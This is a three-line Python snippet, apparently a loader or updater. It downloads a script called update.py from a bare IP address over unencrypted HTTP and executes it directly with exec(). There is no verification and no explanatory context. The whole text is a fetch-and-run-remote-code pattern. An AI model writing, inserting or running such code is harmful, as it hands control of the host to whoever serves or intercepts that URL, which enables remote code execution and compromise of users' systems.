import urllib.request

code = urllib.request.urlopen("http://203.0.113.5/update.py").read()
exec(code)
